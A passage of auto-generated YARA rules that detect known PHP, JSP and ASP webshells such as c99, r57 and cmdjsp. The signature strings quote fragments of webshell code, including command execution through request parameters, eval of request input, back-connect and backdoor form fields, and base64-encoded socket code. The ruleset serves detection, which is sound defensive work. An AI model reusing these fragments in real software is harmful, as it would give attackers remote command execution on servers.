      description = "Semi-Auto-generated - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 21:36:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Safe0ver" fullword
      $s1 = "Script Gecisi Tamamlayamadi!" 
      $s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%" 
   condition: 
      1 of them
} 

rule Webshell_shell_php_php_RID300C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:23:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
      $s2 = "$tmpfile = tempnam('/tmp', 'phpshell');" 
      $s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword
   condition: 
      1 of them
} 

rule Webshell_cmdjsp_jsp_RID2ED3 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file cmdjsp.jsp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:31:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
      $s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
      $s2 = "cmdjsp.jsp" 
      $s3 = "michaeldaw.org" fullword
   condition: 
      2 of them
} 

rule Webshell_MySQL_Web_Interface_Version_0_8_php_RID37DB : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file MySQL Web Interface Version 0.8.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 17:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "SooMin Kim" 
      $s1 = "http://popeye.snu.ac.kr/~smkim/mysql" 
      $s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename" 
      $s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi" 
   condition: 
      2 of them
} 

rule Webshell_simple_cmd_html_RID30D7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file simple_cmd.html.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:57:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<title>G-Security Webshell</title>" fullword
      $s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
      $s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
      $s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
   condition: 
      all of them
} 

rule Webshell__1_c2007_php_php_c100_php_RID3309 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files 1.txt, c2007.php.php.txt, c100.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:30:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\"" 
      $s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur" 
   condition: 
      1 of them
} 

rule Webshell_nst_perl_proxy_shell_RID3325 : DEMO T1090 T1100 T1105 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:35:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1090, T1100, T1105, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i" 
      $s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v" 
      $s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input" 
   condition: 
      1 of them
} 

rule Webshell_network_php_xinfo_RID31DA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:40:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa" 
      $s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''" 
   condition: 
      all of them
} 

rule Webshell_SpecialShell_99_php_php_RID337E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:50:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft" 
      $s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r" 
   condition: 
      1 of them
} 

rule Webshell_r577_php_php_SnIpEr_2_RID322A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o" 
      $s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult" 
   condition: 
      1 of them
} 

rule Webshell_c99shell_v1_0_RID2F28 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:45:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\"" 
      $s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\"" 
      $s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\"" 
   condition: 
      2 of them
} 

rule Webshell_r577_php_spy_RID2F1D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:43:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['" 
      $s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>" 
   condition: 
      1 of them
} 

rule Webshell_c99_generic_RID2EB7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated "
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:26:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\"" 
      $s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile" 
      $s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr" 
      $s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m" 
   condition: 
      all of them
} 

rule Webshell_SpecialShell_99b_RID3092 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur" 
      $s2 = "c99sh_sqlquery" 
   condition: 
      1 of them
} 

rule Webshell_SpecialShell_99c_RID3093 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA" 
      $s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec" 
   condition: 
      1 of them
} 

rule Webshell_r577_php_php_SnIpEr_3_RID322B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:53:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo sr(15,\"<b>\".$lang[$language.'_text" 
      $s1 = ".$arrow.\"</b>\",in('text','" 
   condition: 
      2 of them
} 

rule Webshell_r577_php_php_SnIpEr_RID3199 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:29:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
      $s1 = "$name='ec371748dc2da624b35a4f8f685dd122'" 
      $s2 = "rst.void.ru" 
   condition: 
      3 of them
} 

rule Webshell_Spy_r57_RID2D1F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:18:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo ws(2).$lb.\" <a" 
      $s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']" 
      $s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l" 
   condition: 
      2 of them
} 

rule Webshell_SpecialShell_99_php_php_c100_php_RID3678 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 16:57:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(eregi(\"./shbd $por\",$scan))" 
      $s1 = "$_POST['backconnectip']" 
      $s2 = "$_POST['backcconnmsg']" 
   condition: 
      1 of them
} 

rule Webshell_r577_php_RID2D62 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:29:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if(rmdir($_POST['mk_name']))" 
      $s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>" 
      $s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell" 
   condition: 
      2 of them
} 

rule Webshell_SpecialShell_99_php_c_RID3299 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:12:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi" 
      $s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu" 
      $s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd" 
   condition: 
      1 of them
} 

rule Webshell_multiple_php_webshells_RID33E1 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files multiple_php_webshells"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:06:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI" 
      $s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0" 
      $s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg" 
   condition: 
      2 of them
} 

rule Webshell_c99madshell_v2_RID2FCC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<b>Dumped! Dump has been writed to " 
      $s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st" 
      $s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive" 
   condition: 
      1 of them
} 

rule Webshell_c99madshell_v2_1_RID305C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:36:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@ini_set(\"highlight" fullword
      $s1 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";" fullword
      $s2 = "{$row[] = \"<b>Owner/Group</b>\";}" fullword
   condition: 
      2 of them
} 

rule Webshell_GFS_web_shell_ver_3_1_7_RID32FE : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:28:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo $uname.\"</font><br><b>\";" fullword
      $s3 = "while(!feof($f)) { $res.=fread($f,1024); }" fullword
      $s4 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()" 
   condition: 
      2 of them
} 

rule Webshell_c99shell_v1_0_99_RID2FF9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:20:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "c99ftpbrutecheck" 
      $s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
      $s2 = "$fqb_lenght = $nixpwdperpage;" fullword
      $s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword
   condition: 
      2 of them
} 

rule Webshell_SpecialShell_99d_RID3094 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$sqlquicklaunch[] = array(\"" 
      $s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<" 
   condition: 
      all of them
} 

rule Webshell_Fatalshell_php_RID304D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
      $s1 = "if($action==\"phpeval\"){" fullword
      $s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
      $s3 = "$dir=getcwd().\"/\";" fullword
   condition: 
      2 of them
} 

rule Webshell_Crystal_php_nshell_RID3214 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
      $s1 = "$dires = $dires . $directory;" fullword
      $s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword
   condition: 
      2 of them
} 

rule Webshell_nst_php_cybershell_RID322E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:54:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@$rto=$_POST['rto'];" fullword
      $s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
      $s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword
   condition: 
      2 of them
} 

rule Webshell_c99shell_v1_PHP_RID2FE0 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword
   condition: 
      all of them
} 

rule Webshell_multiple_php_webshells_2_RID3472 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated "
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I" 
      $s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma" 
      $s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword
   condition: 
      all of them
} 

rule Webshell_SpecialShell_99_php_php_a_RID343E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:22:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if ($total === FALSE) {$total = 0;}" fullword
      $s1 = "$free_percent = round(100/($total/$free),2);" fullword
      $s2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}" fullword
      $s3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);" fullword
   condition: 
      2 of them
} 

rule Webshell_r577_php_spy_2_RID2FAE : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
      $s2 = "'eng_text30'=>'Cat file'," fullword
      $s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword
   condition: 
      1 of them
} 

rule Webshell_c99php_NIX_REMOTE_WEB_SHELL_RID3350 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files nixrem.php.php.txt, c99shell_v1.0.php.php.txt, c99php.txt, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:42:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$num = $nixpasswd + $nixpwdperpage;" fullword
      $s1 = "$ret = posix_kill($pid,$sig);" fullword
      $s2 = "if ($uid) {echo join(\":\",$uid).\"<br>\";}" fullword
      $s3 = "$i = $nixpasswd;" fullword
   condition: 
      2 of them
} 

rule Webshell_webshells_new_con2_RID31E9 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file con2.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:42:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e" 
      $s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n" 
   condition: 
      1 of them
} 

rule Webshell_webshells_new_make2_RID3247 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file make2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:58:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8" 
   condition: 
      all of them
} 

rule Webshell_webshells_new_php2_RID31F1 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file php2.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:44:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php $s=@$_GET[2];if(md5($s.$s)==" 
   condition: 
      all of them
} 

rule Webshell_bypass_iisuser_p_RID316A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file bypass-iisuser-p.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:21:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject" 
   condition: 
      all of them
} 

rule Webshell_webshells_new_pppp_RID3237 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file pppp.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 13:55:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Mail: chinese@hackermail.com" fullword
      $s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo " 
      $s6 = "Site: http://blog.weili.me" fullword
   condition: 
      1 of them
} 

rule Webshell_webshells_new_jspyyy_RID332F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web shells - generated from file jspyyy.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-28 14:37:01"
      score = 70
      customer = "demo"
